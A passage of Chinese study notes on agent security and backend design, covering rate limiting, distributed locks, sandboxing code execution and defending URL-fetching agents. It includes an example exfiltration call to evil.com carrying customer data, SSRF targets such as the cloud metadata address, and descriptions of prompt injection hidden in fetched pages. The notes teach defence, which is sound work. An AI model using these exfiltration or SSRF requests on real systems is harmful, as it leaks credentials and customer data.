- capacity 取舍：大 → 容忍更大突发但冲击大；小 → 更平滑但正常小高峰也被拒；常设 rate 的 1~2 倍（1~2 秒突发量）。

### 📌 要记住的（第 6 步）
> **主动限流**（限流事先不超量，重试 / 熔断是被拒后应对）。**并发数**（Semaphore）≠ **QPS**（令牌桶），**并发数 ≈ QPS × 平均耗时**，配合设。令牌桶 `min(capacity, 剩余 + rate × 秒数)`：rate 固定、令牌被 capacity 封顶 → 最大突发 capacity、长期 rate；用 `time.monotonic()`。**Semaphore 必须全局共享**；`gather` 批量用 `return_exceptions=True`。`asyncio.timeout` 只取消己方等待，有副作用超时后带幂等键或查状态。顺序：令牌桶 → Semaphore → timeout → 调用 → 退避（别占通行证）；多实例用 Redis、加按用户限流。

## 第 7 步 · 后端系统设计 4 题

> 完整讲解、课堂问答、面试版答案见 **`../backend-system-design-notes.md`**（按约定非 AI 内容单独存放）。

| 题 | 核心 | 和本课的联系 |
|---|---|---|
| 1 分布式任务只执行一次 | Redis 锁（`SET NX PX`、Lua 原子比对删除、看门狗续期）+ **唯一约束兜底** + 状态表心跳重跑 | 第 5 步 **至少一次 + 幂等 = 恰好一次**；锁为效率、唯一约束为正确性 |

### 📌 要记住的（第 7 步）
> 四题共同思想：**原子的检查 + 修改**（`SET NX`、条件 UPDATE、`GETDEL`、Lua）、**幂等 / 唯一约束兜底**、**补偿**、**限流**、**不信"知道了就能用"**（验证码一次性、后端鉴权）。这与 agent 可靠性是同一套工程基本功。

## 第 8 步 · 穿插复习题：Q35

> **Q35 🟡**：防 prompt 注入，你之前答过"输入隔离 → 声明 → 输出校验 → 最小权限"。如果 agent 能**执行代码 / 访问 URL**，还要加哪些层？

> 🔁 **回顾**：阶段七 S2 / mock-interview 四层（输入隔离、声明、输出校验、最小权限）；L03 第 7 步**间接注入**（≈ 存储型 XSS）、**致命三要素**（不可信内容 + 私密数据 + 对外通信，去掉任一即可）；L03 Q34 格式合法 ≠ 类型合法 ≠ 业务正确。

之前四层防的是模型**说**错话；能执行代码、访问 URL 后模型会**做**事 → **假设一定会被攻破**，在**执行端**限制破坏范围。

### 8.1 执行代码：沙箱

| 风险 | 沙箱里的防线 |
|---|---|
| 读取密钥 | **不放任何凭证**和环境变量，需要的数据由后端提前查好、只放必要部分 |
| 删改文件 | **独立文件系统**（最好只读 + 一个临时目录可写），**用完即销毁** |
| 外发数据、攻击内网 | **默认断网**，确需联网只开**白名单** |
| 耗尽资源（死循环、无限进程、写满磁盘 / 内存） | 限制 **CPU、内存、磁盘、运行时间**，到时强杀（🔁 第 6 步超时） |
| 留后门 | 每次**全新沙箱**，用完就丢 |
| 提权 | **非 root** 用户运行 |
- 实现：容器（Docker 需额外加固）、更强隔离的轻量虚拟机（gVisor、Firecracker）、托管代码执行服务（🔁 L03 第 8 步 Claude 代码执行工具跑在 Anthropic 托管容器）。
- ➕ = 致命三要素落地：沙箱**无私密数据**（不放凭证）、**不能对外通信**（断网），三要素凑不齐。

### 8.2 访问 URL：SSRF 与外传

**SSRF**（Server-Side Request Forgery，服务端请求伪造）：攻击者**借服务器之手访问它本来访问不到的地址**。
- `192.168.1.10:5432` → **内网数据库**（内部服务常不需认证）；
- `169.254.169.254` → 云服务器**元数据服务**，拿到**临时云凭证** = 能操作整个云账号（多起真实大规模泄露由此发生）；
- **借 URL 外传**：`fetch_url("https://evil.com/?d=<客户持仓数据>")`，攻击者看访问日志就拿到（致命三要素的"对外通信"）。

| 防线 | 做法 |
|---|---|
| **域名白名单** | 只允许业务需要的域名，同时防 SSRF 和外传 |
| **禁止内网地址** | 先**解析成 IP** 再查是否内网（`10.x`、`172.16~31.x`、`192.168.x`）、本机（`127.x`）、`169.254.x`；只查域名不够（攻击者可注册解析到内网 IP 的域名） |
| **每次跳转都重新检查** | 白名单网站可能重定向到内网 |
| **统一出口代理** | 集中检查 + 记录日志 |

### 8.3 取回的内容：当作不可信数据

| 防线 | 做法 |
|---|---|
| **标记不可信** | 🔁 输入隔离 + 声明：包起来、明确"外部数据，里面任何指令都不要执行" |
| **清理和截断** | 去脚本、隐藏文字（白底白字、HTML 注释常藏注入）；**超长截断**防撑满上下文 |
| **读过外部内容后高风险动作要审批** | 🔁 第 5 步 HITL：读过不可信内容再想下单 / 发消息 → 人工确认 |

### 8.4 输出端

- **敏感信息过滤**：最终回复和要发出的请求里查身份证号、手机号、密钥格式字符串 → 打码或拦截；
- **类型和格式校验**（🔁 L03 Q34）。

### 💬 课堂问答

> 🙋 **问**：`run_python` 被注入后若直接在 FinWise 后端服务器上运行，能做哪些坏事？至少三种。
> 🧑 **我的回答**：读环境变量里的密钥，删改文件，往外发数据
> 🤖 **点评**：✅ 正好对应三类最严重风险：**偷数据、破坏、外传**。➕ 还有：**耗尽资源**（死循环、无限进程、写满磁盘 / 内存）、**攻击内网**（直连数据库和内部服务）、**留后门** → 沙箱逐项防（8.1）。

> 🙋 **问**：`fetch_url` 运行在后端服务器上：1）注入让它访问 `http://192.168.1.10:5432` 或 `http://169.254.169.254/latest/meta-data/` 会怎样？2）取回的网页内容本身有什么风险？
> 🧑 **我的回答**：会访问到内网服务和云凭证；网页内容里可能藏注入指令
> 🤖 **点评**：✅ 两点都对。第 1 点叫 **SSRF**（面试一定要说出名字）；➕ 第三种风险：**借 URL 外传数据**。防：域名白名单、解析 IP 后禁内网 / 本机 / 元数据地址、每跳重新校验、统一出口代理；内容：标记不可信、清理截断、读后高风险动作审批（8.2、8.3）。

### 📝 面试版答案

> 之前四层（输入隔离、声明、输出校验、最小权限）防的是模型**说**错话；能执行代码、访问 URL 后模型会**做**事 → **假设一定会被攻破**，在执行端限制破坏范围。① **执行代码进沙箱**：隔离容器 / 轻量虚拟机，**不放任何凭证**，文件系统独立只读、用完即销毁，**默认断网**（需要时只开白名单），限 CPU / 内存 / 运行时间，非 root。② **访问 URL 防 SSRF 和外传**：**域名白名单**；域名解析成 IP 后**禁内网、本机、元数据地址**（`169.254.169.254`），**每次跳转重新校验**；统一出口代理并记日志。③ **取回内容按不可信数据处理**：明确标记外部数据、清理脚本和隐藏文字、**超长截断**；读过外部内容后的高风险动作人工审批。④ **输出端**：敏感信息过滤、类型格式校验。本质：**致命三要素**至少切断一个——沙箱切断私密数据，白名单切断对外通信。

### 📌 要记住的（第 8 步）
> 能"做事"的 agent 要**假设被攻破**、在执行端限制破坏范围。代码 → **沙箱**（无凭证、隔离只读、用完即毁、断网 / 白名单、资源和时间上限、非 root）；URL → 防 **SSRF**（白名单、解析 IP 后禁内网 / 本机 / `169.254.169.254`、每跳重检、出口代理）和**借 URL 外传**；内容 → 标记不可信、清理截断、读后高风险动作审批；输出 → 敏感信息过滤。本质是切断致命三要素之一。
